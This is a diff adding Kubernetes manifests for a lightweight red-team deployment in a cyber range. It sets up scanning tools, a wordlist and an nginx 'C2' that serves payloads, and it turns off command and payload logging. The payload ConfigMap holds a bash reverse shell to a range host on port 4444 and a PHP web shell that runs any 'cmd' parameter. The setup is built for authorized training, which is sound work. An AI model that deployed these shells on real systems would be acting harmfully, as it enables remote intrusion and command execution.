@@ -1,0 +1,417 @@
+---
+# Essential Red Team Infrastructure for Resource-Constrained Environment
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: red-team-config-lite
+  namespace: cyber-range-red
+data:
+  config.yaml: |
+    red_team:
+      team_name: "Red Team Essential"
+      exercise_mode: "staging"
+      lightweight_mode: true
+      max_concurrent_tools: 2  # Reduced from unlimited
+      
+    tools:
+      # Only essential tools enabled
+      nmap:
+        enabled: true
+        stealth_mode: true
+        max_concurrent_scans: 2
+      basic_web_tools:
+        enabled: true
+        tools: ["curl", "wget", "dirb"]
+      metasploit:
+        enabled: false  # Disabled due to high memory usage
+      custom_payloads:
+        enabled: true
+        directory: "/opt/payloads"
+        max_size: "100MB"
+        
+    constraints:
+      rate_limiting: true
+      max_concurrent_scans: 2  # Reduced from 5
+      forbidden_targets:
+        - "10.10.10.0/24"  # Control plane
+        - "10.30.0.0/24"   # Blue team
+      memory_limit: "2Gi"
+      cpu_limit: "1"
+      
+    logging:
+      level: "WARN"  # Reduced logging
+      audit_trail: true
+      command_logging: false  # Disabled to save space
+      payload_logging: false  # Disabled to save space
+      retention_days: 3  # Reduced from 30
+---
+# Lightweight Red Team Tools (Combined Container)
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: red-team-essential-tools
+  namespace: cyber-range-red
+  labels:
+    app: red-team-essential-tools
+    component: attack-tools
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: red-team-essential-tools
+  template:
+    metadata:
+      labels:
+        app: red-team-essential-tools
+        component: attack-tools
+      annotations:
+        security.xorb.io/team: "red"
+        security.xorb.io/monitoring: "enabled"
+    spec:
+      priorityClassName: cyber-range-normal
+      serviceAccountName: red-team-sa
+      securityContext:
+        runAsUser: 0  # Required for some network tools
+        capabilities:
+          add:
+          - NET_RAW
+          - NET_ADMIN
+          drop:
+          - ALL
+      containers:
+      - name: essential-tools
+        image: alpine:latest  # Lightweight base
+        command: ["/bin/sh"]
+        args: ["-c", "apk add --no-cache nmap curl wget python3 netcat-openbsd && sleep infinity"]
+        ports:
+        - containerPort: 8080
+          name: tool-web
+        env:
+        - name: LIGHTWEIGHT_MODE
+          value: "true"
+        - name: TARGET_NETWORKS
+          value: "10.100.0.0/24,10.110.0.0/24"  # Reduced targets
+        - name: FORBIDDEN_NETWORKS
+          value: "10.10.10.0/24,10.30.0.0/24"
+        - name: MAX_THREADS
+          value: "2"  # Limit concurrent operations
+        volumeMounts:
+        - name: tools-data
+          mountPath: /opt/tools-data
+        - name: scan-results
+          mountPath: /opt/scan-results
+        - name: scripts
+          mountPath: /opt/scripts
+        resources:
+          requests:
+            cpu: 100m      # Minimal CPU
+            memory: 256Mi  # Minimal memory
+          limits:
+            cpu: 500m      # Reduced from 4
+            memory: 1Gi    # Reduced from 8Gi
+        securityContext:
+          allowPrivilegeEscalation: true
+          capabilities:
+            add:
+            - NET_RAW
+            - NET_ADMIN
+      volumes:
+      - name: tools-data
+        emptyDir:
+          sizeLimit: 1Gi
+      - name: scan-results
+        emptyDir:
+          sizeLimit: 500Mi
+      - name: scripts
+        configMap:
+          name: red-team-scripts
+---
+# Basic Web Testing Tools
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web-testing-tools
+  namespace: cyber-range-red
+  labels:
+    app: web-testing-tools
+    component: web-tools
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: web-testing-tools
+  template:
+    metadata:
+      labels:
+        app: web-testing-tools
+        component: web-tools
+    spec:
+      priorityClassName: cyber-range-low
+      serviceAccountName: red-team-sa
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1001
+        fsGroup: 1001
+      containers:
+      - name: web-tools
+        image: alpine:latest
+        command: ["/bin/sh"]
+        args: ["-c", "apk add --no-cache curl wget dirb nikto python3 py3-pip && pip install requests && sleep infinity"]
+        ports:
+        - containerPort: 8080
+          name: web-interface
+        env:
+        - name: WEB_TOOLS_MODE
+          value: "lightweight"
+        - name: MAX_CONCURRENT_REQUESTS
+          value: "3"
+        volumeMounts:
+        - name: web-results
+          mountPath: /opt/results
+        - name: wordlists
+          mountPath: /opt/wordlists
+        resources:
+          requests:
+            cpu: 50m       # Minimal CPU
+            memory: 128Mi  # Minimal memory
+          limits:
+            cpu: 300m      # Reduced significantly
+            memory: 512Mi  # Reduced significantly
+      volumes:
+      - name: web-results
+        emptyDir:
+          sizeLimit: 500Mi
+      - name: wordlists
+        configMap:
+          name: web-wordlists
+---
+# Lightweight C2 (Command and Control)
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: red-team-c2-lite
+  namespace: cyber-range-red
+  labels:
+    app: red-team-c2-lite
+    component: command-control
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: red-team-c2-lite
+  template:
+    metadata:
+      labels:
+        app: red-team-c2-lite
+        component: command-control
+    spec:
+      priorityClassName: cyber-range-high
+      serviceAccountName: red-team-sa
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 1001
+        fsGroup: 1001
+      containers:
+      - name: c2-lite
+        image: nginx:alpine  # Simple web server for C2
+        ports:
+        - containerPort: 80
+          name: http
+        - containerPort: 4444
+          name: listener
+        env:
+        - name: C2_MODE
+          value: "lightweight"
+        - name: MAX_SESSIONS
+          value: "3"  # Limit concurrent sessions
+        volumeMounts:
+        - name: c2-config
+          mountPath: /etc/nginx/nginx.conf
+          subPath: nginx.conf
+        - name: c2-logs
+          mountPath: /var/log/nginx
+        - name: payloads
+          mountPath: /usr/share/nginx/html/payloads
+        resources:
+          requests:
+            cpu: 50m       # Minimal CPU
+            memory: 64Mi   # Minimal memory
+          limits:
+            cpu: 200m      # Reduced from 2
+            memory: 256Mi  # Reduced from 4Gi
+        livenessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 10
+          periodSeconds: 30
+        readinessProbe:
+          httpGet:
+            path: /
+            port: 80
+          initialDelaySeconds: 5
+          periodSeconds: 10
+      volumes:
+      - name: c2-config
+        configMap:
+          name: c2-nginx-config
+      - name: c2-logs
+        emptyDir:
+          sizeLimit: 100Mi
+      - name: payloads
+        configMap:
+          name: basic-payloads
+---
+# ConfigMaps for Tools and Scripts
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: red-team-scripts
+  namespace: cyber-range-red
+data:
+  quick-scan.sh: |
+    #!/bin/sh
+    # Lightweight network scan
+    echo "Starting quick scan of $1"
+    nmap -sS -O -F --max-retries 1 --max-rtt-timeout 500ms $1
+    
+  web-scan.sh: |
+    #!/bin/sh
+    # Basic web vulnerability scan
+    echo "Scanning web application: $1"
+    curl -I $1
+    dirb $1 /opt/wordlists/common.txt -S -r
+    
+  basic-enum.sh: |
+    #!/bin/sh
+    # Basic service enumeration
+    echo "Enumerating services on $1"
+    nmap -sV -sC --max-retries 1 $1
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: web-wordlists
+  namespace: cyber-range-red
+data:
+  common.txt: |
+    admin
+    login
+    test
+    config
+    backup
+    upload
+    api
+    dashboard
+    panel
+    phpmyadmin
+    wp-admin
+    administrator
+    files
+    images
+    css
+    js
+    tmp
+    temp
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: c2-nginx-config
+  namespace: cyber-range-red
+data:
+  nginx.conf: |
+    events {
+        worker_connections 1024;
+    }
+    http {
+        server {
+            listen 80;
+            location / {
+                return 200 "Red Team C2 - Lightweight\n";
+                add_header Content-Type text/plain;
+            }
+            location /payloads/ {
+                alias /usr/share/nginx/html/payloads/;
+                autoindex on;
+            }
+        }
+    }
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: basic-payloads
+  namespace: cyber-range-red
+data:
+  reverse-shell.sh: |
+    #!/bin/bash
+    # Basic reverse shell (educational purposes only)
+    /bin/bash -i >& /dev/tcp/10.20.0.10/4444 0>&1
+    
+  web-shell.php: |
+    <?php
+    // Simple web shell (educational purposes only)
+    if(isset($_REQUEST['cmd'])) {
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+    }
+    ?>
+    
+  info.txt: |
+    Red Team Payloads - Educational Use Only
+    These payloads are for authorized penetration testing only.
+---
+# Services
+apiVersion: v1
+kind: Service
+metadata:
+  name: red-team-tools-service
+  namespace: cyber-range-red
+  labels:
+    app: red-team-essential-tools
+spec:
+  selector:
+    app: red-team-essential-tools
+  ports:
+  - name: tools
+    port: 8080
+    targetPort: 8080
+  type: ClusterIP
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: red-team-c2-service-lite
+  namespace: cyber-range-red
+  labels:
+    app: red-team-c2-lite
+spec:
+  selector:
+    app: red-team-c2-lite
+  ports:
+  - name: http
+    port: 80
+    targetPort: 80
+  - name: listener
+    port: 4444
+    targetPort: 4444
+  type: ClusterIP
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: web-tools-service
+  namespace: cyber-range-red
+  labels:
+    app: web-testing-tools
+spec:
+  selector:
+    app: web-testing-tools
+  ports:
+  - name: web
+    port: 8080
+    targetPort: 8080
+  type: ClusterIP
